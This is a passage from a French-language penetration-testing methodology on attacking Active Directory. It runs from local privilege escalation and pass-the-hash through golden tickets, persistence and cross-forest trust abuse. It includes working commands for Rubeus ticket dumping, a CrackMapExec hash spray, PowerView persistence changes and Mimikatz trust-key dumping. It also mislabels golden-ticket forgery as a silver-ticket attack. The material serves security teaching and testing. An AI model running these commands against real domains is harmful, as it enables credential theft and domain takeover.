### Connexion à distance (RDP, SSH, FTP, Win-RM, etc.)

Une fois des identifiants obtenus, vous pouvez vérifier si vous avez accès à une **machine**. Pour cela, vous pouvez utiliser **CrackMapExec** afin de tenter de vous connecter à plusieurs serveurs avec différents protocoles, en fonction de vos scans de ports.

### Local Privilege Escalation

Si vous avez compromis des identifiants ou une session en tant qu’utilisateur de domaine standard et que vous pouvez accéder à **n’importe quelle machine du domaine**, cherchez un moyen d’**élever vos privilèges localement et de collecter des identifiants**. Des privilèges d’administrateur local peuvent permettre de **récupérer les hashes d’autres utilisateurs** depuis la mémoire (LSASS) et le stockage local (SAM).

Ce livre contient une page complète sur [**l’élévation de privilèges locale sous Windows**](../windows-local-privilege-escalation/index.html) et une [**checklist**](../checklist-windows-privilege-escalation.md). N’oubliez pas non plus d’utiliser [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets de la session actuelle

Il est très **peu probable** que vous trouviez des **tickets** dans l’utilisateur actuel qui vous **donnent accès à** des ressources inattendues, mais vous pouvez vérifier :

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Avec des identifiants de domaine ou une session utilisateur, réexaminez les [**attaques de relay NTLM**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) : les techniques d’énumération authentifiée et de coercition peuvent révéler des chemins de relay qui n’étaient pas accessibles lors de la reconnaissance sans authentification.

### Recherche de creds dans les partages d’ordinateurs | Partages SMB

Maintenant que vous disposez d’identifiants de base, vérifiez si vous pouvez **trouver** des **fichiers intéressants partagés au sein de l’AD**. Vous pouvez le faire manuellement, mais c’est une tâche très ennuyeuse et répétitive (surtout si vous trouvez des centaines de documents à vérifier).

[**Suivez ce lien pour découvrir les outils que vous pouvez utiliser.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Vol de creds NTLM

Si vous pouvez **accéder à d’autres PC ou partages**, vous pouvez **y placer des fichiers** (comme un fichier SCF) qui, s’ils sont consultés d’une manière ou d’une autre, d**éclencheront une authentification NTLM auprès de vous**, ce qui vous permettra de **voler** le **challenge NTLM** pour le casser :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Cette vulnérabilité permettait à tout utilisateur authentifié de **compromettre le contrôleur de domaine**.


{{#ref}}
printnightmare.md
{{#endref}}

## Élévation de privilèges sur Active Directory AVEC des identifiants/une session privilégiés

**Pour les techniques suivantes, un utilisateur de domaine standard ne suffit pas : vous avez besoin de privilèges ou d’identifiants spécifiques pour effectuer ces attaques.**

### Extraction de hashes

Avec un peu de chance, vous avez réussi à **compromettre** un compte **administrateur local** avec [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), y compris en relayant, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [l’élévation des privilèges en local](../windows-local-privilege-escalation/index.html).\
Ensuite, il est temps d’extraire tous les hashes de la mémoire et du système local.\
[**Consultez cette page pour découvrir différentes façons d’obtenir les hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Une fois que vous avez le hash d’un utilisateur**, vous pouvez l’utiliser pour **usurper son identité**.\
Vous devez utiliser un **outil** qui **effectuera** l’**authentification NTLM à l’aide** de ce **hash**, **ou** vous pouvez créer un nouveau **sessionlogon** et **injecter** ce **hash** dans **LSASS** ; ainsi, ce **hash sera utilisé lors de toute authentification NTLM**. C’est ce que fait mimikatz avec la dernière option.\
[**Consultez cette page pour plus d’informations.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Cette attaque vise à **utiliser le hash NTLM de l’utilisateur pour demander des tickets Kerberos**, comme alternative à la méthode courante Pass The Hash via le protocole NTLM. Elle peut donc être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et où **seul Kerberos est autorisé** comme protocole d’authentification.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Dans la méthode d’attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d’authentification d’un utilisateur** plutôt que son mot de passe ou ses valeurs de hash. Ce ticket volé est ensuite utilisé pour **usurper l’identité de l’utilisateur** et obtenir un accès non autorisé aux ressources et aux services du réseau.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Réutilisation des identifiants

Si vous avez le **hash** ou le **mot de passe** d’un **administrateur local**, vous devriez essayer de vous **connecter localement** à d’autres **PC** avec celui-ci.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Notez que cela génère beaucoup de **bruit** et que **LAPS** permettrait de l’**atténuer**.

### Abus de MSSQL et Trusted Links

Si un utilisateur dispose des privilèges nécessaires pour **accéder aux instances MSSQL**, il pourrait s’en servir pour **exécuter des commandes** sur l’hôte MSSQL (si celui-ci s’exécute en tant que SA), **voler** le **hash** NetNTLM, voire effectuer une **attaque** par **relay**.\
Si une instance MSSQL est approuvée par une autre instance via un database link, un utilisateur disposant de privilèges sur la base de données liée pourrait **exploiter la relation de confiance pour exécuter des requêtes sur l’autre instance**. Ces relations de confiance peuvent être chaînées et mener éventuellement à une base de données mal configurée sur laquelle l’utilisateur peut exécuter des commandes.\
**Les liens entre bases de données fonctionnent également à travers les trusts de forêt.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abus des plateformes de gestion des actifs informatiques et de déploiement

Les suites tierces d’inventaire et de déploiement exposent souvent des moyens puissants d’accéder aux identifiants et d’exécuter du code. Voir :

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si vous trouvez un objet Computer avec l’attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) et que vous disposez de privilèges de domaine sur cet ordinateur, vous pourrez extraire de la mémoire les TGT de tous les utilisateurs qui s’y connectent.\
Ainsi, si un **Domain Admin se connecte à l’ordinateur**, vous pourrez extraire son TGT et usurper son identité avec [Pass the Ticket](pass-the-ticket.md).\
Grâce à la constrained delegation, vous pourriez même **compromettre automatiquement un Print Server** (idéalement, il s’agira d’un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un utilisateur ou un ordinateur est autorisé à utiliser la « Constrained Delegation », il pourra **usurper l’identité de n’importe quel utilisateur pour accéder à certains services sur un ordinateur**.\
Ainsi, si vous **compromettez le hash** de cet utilisateur ou de cet ordinateur, vous pourrez **usurper l’identité de n’importe quel utilisateur** (même celle de Domain Admins) pour accéder à certains services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Disposer du privilège **WRITE** sur un objet Active Directory d’un ordinateur distant permet d’obtenir une exécution de code avec des **privilèges élevés** :


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abus des permissions/ACLs

L’utilisateur compromis pourrait disposer de **privilèges intéressants sur certains objets du domaine**, qui pourraient vous permettre de **vous déplacer latéralement** ou d’**élever vos privilèges**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abus du service Printer Spooler

La découverte d’un **service Spool en écoute** dans le domaine peut être **exploitée** pour **obtenir de nouveaux identifiants** et **élever ses privilèges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abus des sessions tierces

Si **d’autres utilisateurs** **accèdent** à la machine **compromise**, il est possible de **récupérer des identifiants depuis la mémoire** et même d’**injecter des beacons dans leurs processus** pour usurper leur identité.\
Les utilisateurs accèdent généralement au système via RDP. Voici donc comment mener quelques attaques contre les sessions RDP de tiers :


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fournit un système de gestion du **mot de passe Administrateur local** sur les ordinateurs joints au domaine, afin de garantir qu’il soit **aléatoire**, unique et fréquemment **modifié**. Ces mots de passe sont stockés dans Active Directory et leur accès est contrôlé par des ACLs qui le limitent aux utilisateurs autorisés. Avec des permissions suffisantes pour accéder à ces mots de passe, il devient possible de pivoter vers d’autres ordinateurs.


{{#ref}}
laps.md
{{#endref}}

### Vol de certificats

Pour en savoir plus sur l’inscription AD CS, le mappage des certificats et l’énumération avant de chercher à voler des certificats ou à abuser de templates, consultez la [présentation des certificats AD](ad-certificates.md).

**La collecte de certificats** sur la machine compromise peut permettre d’élever ses privilèges dans l’environnement :


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abus des templates de certificats

Si des **templates vulnérables** sont configurés, il est possible de les exploiter pour élever ses privilèges :


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation avec un compte à privilèges élevés

### Extraction des identifiants du domaine

Une fois que vous avez obtenu les privilèges **Domain Admin**, voire mieux, **Enterprise Admin**, vous pouvez **extraire** la **base de données du domaine** : _ntds.dit_.

[**Vous trouverez ici plus d’informations sur l’attaque DCSync**](dcsync.md).

[**Vous trouverez ici plus d’informations sur le vol de NTDS.dit**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Une archive de sauvegarde lisible contenant `ntds.dit` et la ruche `SYSTEM` doit être considérée comme des données de l’annuaire exposées, même avant son extraction. Un hash de mot de passe obsolète ne rend pas sûrs les autres attributs de l’objet : des champs comme `description` peuvent contenir des identifiants ou des notes opérationnelles. Examinez d’abord les noms des membres de l’archive et évitez d’inclure le contenu de la base de données extraite dans les résultats d’énumération courants.

### Privesc comme mécanisme de persistance

Certaines des techniques abordées précédemment peuvent être utilisées pour assurer la persistance.\
Par exemple, vous pourriez :

- Rendre des utilisateurs vulnérables à [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Rendre les utilisateurs vulnérables à [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Accorder des privilèges [**DCSync**](#dcsync) à un utilisateur

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

L’**attaque Silver Ticket** crée un **ticket Ticket Granting Service (TGS) légitime** pour un service spécifique à l’aide du **hash NTLM** (par exemple, le **hash du compte de l’ordinateur**). Cette méthode permet d’**accéder aux privilèges du service**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Une **attaque Golden Ticket** consiste pour un attaquant à obtenir le **hash NTLM du compte krbtgt** dans un environnement Active Directory (AD). Ce compte est particulier, car il sert à signer tous les **Ticket Granting Tickets (TGT)**, indispensables à l’authentification au sein du réseau AD.

Une fois ce hash obtenu, l’attaquant peut créer des **TGT** pour n’importe quel compte de son choix (attaque Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ces tickets ressemblent aux Golden Tickets, mais sont forgés de manière à **contourner les mécanismes courants de détection des Golden Tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistance par certificats de compte**

**Posséder les certificats d’un compte ou pouvoir en demander** est un très bon moyen de maintenir la persistance dans le compte d’un utilisateur (même s’il change son mot de passe) :


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistance par certificats de domaine**

**Les certificats permettent également de maintenir la persistance avec des privilèges élevés au sein du domaine :**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Groupe AdminSDHolder

L’objet **AdminSDHolder** dans Active Directory protège les **groupes privilégiés** (comme Domain Admins et Enterprise Admins) en appliquant une **Access Control List (ACL)** standard à ces groupes afin d’empêcher les modifications non autorisées. Cette fonctionnalité peut toutefois être exploitée : si un attaquant modifie l’ACL d’AdminSDHolder pour accorder un accès total à un utilisateur standard, celui-ci obtient un contrôle étendu sur tous les groupes privilégiés. Cette mesure de sécurité, conçue pour protéger, peut donc se retourner contre son objectif et permettre un accès indu si elle n’est pas surveillée de près.

[**Plus d’informations sur le groupe AdminDSHolder ici.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Identifiants DSRM

Chaque **Domain Controller (DC)** possède un compte **administrateur local**. En obtenant des droits d’administrateur sur une telle machine, le hash de l’administrateur local peut être extrait avec **mimikatz**. Il faut ensuite modifier le registre pour **activer l’utilisation de ce mot de passe** et ainsi permettre l’accès à distance au compte Administrateur local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistance ACL

Vous pouvez **accorder** à un **utilisateur** certaines **autorisations spéciales** sur des objets spécifiques du domaine, ce qui lui permettra d’**élever ses privilèges à l’avenir**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Descripteurs de sécurité

Les **descripteurs de sécurité** servent à **stocker** les **autorisations** qu’un **objet** possède **sur** un autre **objet**. Une simple **petite modification** du **descripteur de sécurité** d’un objet peut vous conférer des privilèges très intéressants sur celui-ci, sans qu’il soit nécessaire d’appartenir à un groupe privilégié.


{{#ref}}
security-descriptors.md
{{#endref}}

### Objets dynamiques : anti-forensique / évasion

Abusez de la classe auxiliaire `dynamicObject` pour créer des principaux/GPO/enregistrements DNS à courte durée de vie avec `entryTTL`/`msDS-Entry-Time-To-Die` ; ils s’effacent d’eux-mêmes sans tombstones, effaçant les preuves LDAP tout en laissant des SID orphelins, des références `gPLink` rompues ou des réponses DNS mises en cache (par exemple, pollution des ACE d’AdminSDHolder ou redirections malveillantes de `gPCFileSysPath`/DNS intégré à AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifiez **LSASS** en mémoire pour mettre en place un **mot de passe universel**, qui donne accès à tous les comptes du domaine.


{{#ref}}
skeleton-key.md
{{#endref}}

### SSP personnalisé

[Découvrez ici ce qu’est un SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** pour **capturer en clair** les **identifiants** utilisés pour accéder à la machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Cette technique enregistre un **nouveau Domain Controller** dans l’AD et l’utilise pour **pousser des attributs** (SIDHistory, SPN...) sur des objets spécifiés **sans** laisser de **journaux** concernant les **modifications**. Vous **devez avoir les privilèges DA** et vous trouver dans le **domaine racine**.\
Notez que si vous utilisez des données incorrectes, des journaux plutôt disgracieux apparaîtront.

{{#ref}}
dcshadow.md
{{#endref}}

### Persistance LAPS

Nous avons précédemment vu comment élever ses privilèges si vous avez **suffisamment d’autorisations pour lire les mots de passe LAPS**. Cependant, ces mots de passe peuvent aussi servir à **maintenir la persistance**.\
Voir :


{{#ref}}
laps.md
{{#endref}}

## Élévation de privilèges dans la forêt - relations d’approbation entre domaines

Microsoft considère la **forêt** comme la limite de sécurité. Cela signifie que **la compromission d’un seul domaine peut potentiellement entraîner celle de toute la forêt**.<sup>[[1]](#references)</sup>

### Informations de base

Une [**relation d’approbation entre domaines**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) est un mécanisme de sécurité qui permet à un utilisateur d’un **domaine** d’accéder aux ressources d’un autre **domaine**. Elle établit essentiellement un lien entre les systèmes d’authentification des deux domaines, permettant aux vérifications d’authentification de s’effectuer de manière transparente. Lorsque des domaines établissent une relation d’approbation, ils échangent et conservent des **clés** spécifiques dans leurs **Domain Controllers (DC)**, essentielles à l’intégrité de cette relation.

Dans un scénario courant, si un utilisateur souhaite accéder à un service dans un **domaine approuvé**, il doit d’abord demander un ticket spécial appelé **TGT inter-royaumes** au DC de son propre domaine. Ce TGT est chiffré avec une **clé** partagée convenue par les deux domaines. L’utilisateur présente ensuite ce TGT au **DC du domaine approuvé** pour obtenir un ticket de service (**TGS**). Après avoir validé le TGT inter-royaumes, le DC du domaine approuvé émet un TGS qui autorise l’utilisateur à accéder au service.

**Étapes** :

1. Un **ordinateur client** du **Domaine 1** commence le processus en utilisant son **hash NTLM** pour demander un **Ticket Granting Ticket (TGT)** à son **Domain Controller (DC1)**.
2. DC1 émet un nouveau TGT si l’authentification du client réussit.
3. Le client demande ensuite à DC1 un **TGT inter-royaumes**, nécessaire pour accéder aux ressources du **Domaine 2**.
4. Le TGT inter-royaumes est chiffré avec une **clé d’approbation** partagée entre DC1 et DC2 dans le cadre de la relation d’approbation bidirectionnelle entre les deux domaines.
5. Le client présente le TGT inter-royaumes au **Domain Controller du Domaine 2 (DC2)**.
6. DC2 vérifie le TGT inter-royaumes à l’aide de la clé d’approbation partagée et, s’il est valide, émet un **Ticket Granting Service (TGS)** pour le serveur du Domaine 2 auquel le client souhaite accéder.
7. Enfin, le client présente ce TGS au serveur. Celui-ci est chiffré avec le hash du compte du serveur et permet d’accéder au service du Domaine 2.

### Différents types de relations d’approbation

Il est important de noter qu’une **relation d’approbation peut être unidirectionnelle ou bidirectionnelle**. Dans le cas d’une relation bidirectionnelle, les deux domaines se font mutuellement confiance. Dans le cas d’une relation **unidirectionnelle**, l’un des domaines est le domaine **approuvé** et l’autre le domaine **approbateur**. Dans ce dernier cas, **vous ne pourrez accéder aux ressources du domaine approbateur que depuis le domaine approuvé**.

Si le Domaine A fait confiance au Domaine B, A est le domaine approbateur et B le domaine approuvé. De plus, dans le **Domaine A**, il s’agit d’une **relation d’approbation sortante** ; dans le **Domaine B**, il s’agit d’une **relation d’approbation entrante**.

**Différents types de relations d’approbation**

- **Relations parent-enfant** : Il s’agit d’une configuration courante au sein d’une même forêt, dans laquelle un domaine enfant dispose automatiquement d’une relation d’approbation transitive bidirectionnelle avec son domaine parent. Ainsi, les demandes d’authentification peuvent circuler sans difficulté entre le parent et l’enfant.
- **Relations entre domaines enfants** : Appelées « relations d’approbation raccourcies », elles sont établies entre des domaines enfants afin d’accélérer les processus de redirection. Dans les forêts complexes, les redirections d’authentification doivent généralement remonter jusqu’à la racine de la forêt, puis redescendre vers le domaine cible. La création de relations directes raccourcit le parcours, ce qui est particulièrement utile dans les environnements géographiquement dispersés.
- **Relations d’approbation externes** : Elles sont établies entre des domaines distincts et sans lien, et ne sont pas transitives par nature. Selon la [documentation de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), les relations d’approbation externes permettent d’accéder aux ressources d’un domaine situé hors de la forêt actuelle et non relié par une relation d’approbation de forêt. Le filtrage SID renforce la sécurité de ces relations.
- **Relations d’approbation de racine d’arborescence** : Ces relations sont automatiquement établies entre le domaine racine de la forêt et une nouvelle racine d’arborescence ajoutée. Bien qu’elles soient peu fréquentes, elles sont importantes pour ajouter de nouvelles arborescences de domaines à une forêt, leur permettant de conserver un nom de domaine unique tout en garantissant une transitivité bidirectionnelle. Pour en savoir plus, consultez le [guide de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Relations d’approbation de forêt** : Ce type de relation est bidirectionnel et transitif entre deux domaines racines de forêt ; il applique également le filtrage SID afin de renforcer la sécurité.
- **Relations d’approbation MIT** : Elles sont établies avec des domaines Kerberos non Windows conformes à [RFC4120](https://tools.ietf.org/html/rfc4120). Ces relations sont plus spécialisées et destinées aux environnements qui doivent s’intégrer à des systèmes basés sur Kerberos hors de l’écosystème Windows.

#### Autres différences entre les **relations d’approbation**

- Une relation d’approbation peut aussi être **transitive** (A fait confiance à B, B fait confiance à C, donc A fait confiance à C) ou **non transitive**.
- Une relation d’approbation peut être **bidirectionnelle** (les deux domaines se font confiance) ou **unidirectionnelle** (un seul fait confiance à l’autre).

### Chemin d’attaque

1. **Énumérez** les relations d’approbation.
2. Vérifiez si un **principal de sécurité** (utilisateur/groupe/ordinateur) a **accès** aux ressources de **l’autre domaine**, par exemple via des entrées ACE ou parce qu’il appartient à des groupes de l’autre domaine. Recherchez les **relations entre domaines** (c’est probablement pour cela que la relation d’approbation a été créée).
   1. Le kerberoast peut aussi être une option dans ce cas.
3. **Compromettez** les **comptes** qui peuvent permettre de **pivoter** entre les domaines.

Les attaquants qui peuvent accéder aux ressources d’un autre domaine disposent de trois principaux mécanismes :

- **Appartenance à un groupe local** : Des principaux peuvent être ajoutés à des groupes locaux sur des machines, par exemple au groupe « Administrateurs » d’un serveur, ce qui leur donne un contrôle important sur cette machine.
- **Appartenance à un groupe d’un domaine externe** : Des principaux peuvent également appartenir à des groupes du domaine externe. Toutefois, l’efficacité de cette méthode dépend de la nature de la relation d’approbation et de la portée du groupe.
- **Listes de contrôle d’accès (ACL)** : Des principaux peuvent figurer dans une **ACL**, notamment comme entités dans des **ACE** au sein d’une **DACL**, ce qui leur donne accès à certaines ressources. Pour approfondir le fonctionnement des ACL, DACL et ACE, le livre blanc intitulé « [An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf) » est une ressource précieuse.<sup>[[17]](#references)</sup>

### Trouver des utilisateurs/groupes externes disposant d’autorisations

Vous pouvez consulter **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** pour trouver les principaux de sécurité étrangers du domaine. Il s’agit d’utilisateurs/groupes provenant **d’un domaine ou d’une forêt externe**.

Vous pouvez les rechercher dans **Bloodhound** ou avec powerview :

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Élévation de privilèges de l’enfant vers le parent dans une forêt

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Autres façons d’énumérer les relations d’approbation de domaine :

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Il existe **2 clés de confiance**, l’une pour _Domaine enfant --> domaine parent_ et l’autre pour _Domaine parent_ --> _domaine enfant_.\
> Vous pouvez trouver celle utilisée par le domaine actuel avec :
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### Injection de SID-History

Élevez vos privilèges au niveau d’Enterprise admin vers le domaine enfant/parent en abusant de la relation d’approbation avec l’injection de SID-History :


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploiter la Configuration NC accessible en écriture

Comprendre comment la Configuration Naming Context (NC) peut être exploitée est essentiel. Dans les environnements Active Directory (AD), la Configuration NC sert de référentiel central pour les données de configuration de l’ensemble de la forêt. Ces données sont répliquées sur chaque Domain Controller (DC) de la forêt, les DC accessibles en écriture conservant une copie modifiable de la Configuration NC. Pour l’exploiter, il faut disposer des privilèges **SYSTEM sur un DC**, de préférence un DC enfant.

**Lier une GPO au site du DC racine**

Le conteneur Sites de la Configuration NC contient des informations sur les sites de tous les ordinateurs joints au domaine dans la forêt AD. Avec les privilèges SYSTEM sur n’importe quel DC, les attaquants peuvent lier des GPO aux sites du DC racine. Cette action peut compromettre le domaine racine en manipulant les stratégies appliquées à ces sites.

Pour plus d’informations, consultez les recherches sur le [contournement du filtrage SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromettre n’importe quel gMSA de la forêt**

Une méthode d’attaque consiste à cibler les gMSA privilégiés du domaine. La clé racine KDS, indispensable au calcul des mots de passe des gMSA, est stockée dans la Configuration NC. Avec les privilèges SYSTEM sur n’importe quel DC, il est possible d’accéder à la clé racine KDS et de calculer les mots de passe de n’importe quel gMSA de la forêt.

Une analyse détaillée et des instructions étape par étape sont disponibles ici :


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attaque complémentaire par délégation de MSA (BadSuccessor – abus des attributs de migration) :


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Recherche externe complémentaire : [attaques Golden gMSA Trust](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Attaque par modification du schéma**

Cette méthode demande de la patience : il faut attendre la création de nouveaux objets AD privilégiés. Avec les privilèges SYSTEM, un attaquant peut modifier le schéma AD afin d’accorder à n’importe quel utilisateur le contrôle complet de toutes les classes. Cela peut entraîner un accès non autorisé aux nouveaux objets AD et leur prise de contrôle.

Pour en savoir plus, consultez [les attaques de confiance par modification du schéma](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**De DA à EA avec ADCS ESC5**

La vulnérabilité ADCS ESC5 cible le contrôle des objets Public Key Infrastructure (PKI) afin de créer un modèle de certificat permettant de s’authentifier en tant que n’importe quel utilisateur de la forêt. Comme les objets PKI se trouvent dans la Configuration NC, la compromission d’un DC enfant accessible en écriture permet d’exécuter des attaques ESC5.

Pour en savoir plus, consultez [De DA à EA avec ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> En l’absence d’ADCS, l’attaquant peut mettre en place les composants nécessaires, comme expliqué dans [Passer d’administrateur de domaine enfant à Enterprise admin](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Domaine de forêt externe - unidirectionnel (entrant) ou bidirectionnel

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Dans ce scénario, **votre domaine est approuvé** par un domaine externe, qui vous accorde des **autorisations indéterminées** sur celui-ci. Vous devrez déterminer **quels principals de votre domaine disposent de quels accès au domaine externe**, puis tenter de les exploiter :

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domaine de forêt externe - unidirectionnel (sortant)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Dans ce scénario, **votre domaine** **fait confiance** à des **privilèges** accordés à un principal d’un **autre domaine**.

Cependant, lorsqu’un domaine fait confiance à un autre, le domaine de confiance **crée un utilisateur** dont le **nom prévisible** utilise le **mot de passe de confiance** comme mot de passe. Il est donc possible d’**accéder à un utilisateur du domaine qui fait confiance** pour entrer dans le domaine de confiance, l’énumérer et tenter d’obtenir davantage de privilèges :

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Une autre façon de compromettre le domaine de confiance consiste à trouver un [**lien SQL de confiance**](abusing-ad-mssql.md#mssql-trusted-links) créé dans le **sens opposé** à celui de la relation d’approbation entre les domaines (ce qui est assez rare).

Une autre façon de compromettre le domaine de confiance consiste à attendre sur une machine à laquelle un **utilisateur du domaine de confiance peut accéder** pour se connecter via **RDP**. L’attaquant pourrait alors injecter du code dans le processus de la session RDP et **accéder au domaine d’origine de la victime** depuis cette session.\
De plus, si la **victime a monté son disque dur**, l’attaquant pourrait, depuis le processus de la **session RDP**, placer des **backdoors** dans le **dossier de démarrage du disque dur**. Cette technique s’appelle **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mesures d’atténuation contre l’abus des relations d’approbation entre domaines

### **Filtrage SID :**

- Le filtrage SID, activé par défaut sur toutes les relations d’approbation entre forêts, atténue les risques liés aux attaques exploitant l’attribut SID history à travers ces relations. Cette mesure repose sur l’hypothèse que les relations d’approbation au sein d’une forêt sont sécurisées, Microsoft considérant la forêt, et non le domaine, comme la frontière de sécurité.
- Il y a toutefois un inconvénient : le filtrage SID peut perturber les applications et l’accès des utilisateurs, ce qui conduit parfois à le désactiver.

### **Authentification sélective :**

- Pour les relations d’approbation entre forêts, l’authentification sélective garantit que les utilisateurs des deux forêts ne sont pas automatiquement authentifiés. Les utilisateurs doivent plutôt disposer d’autorisations explicites pour accéder aux domaines et aux serveurs de la forêt ou du domaine qui fait confiance.
- Il est important de noter que ces mesures ne protègent pas contre l’exploitation du contexte de nommage Configuration inscriptible (NC) ni contre les attaques visant le compte d’approbation.

[**Plus d’informations sur les relations d’approbation entre domaines sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abus d’AD via LDAP depuis des implants sur l’hôte

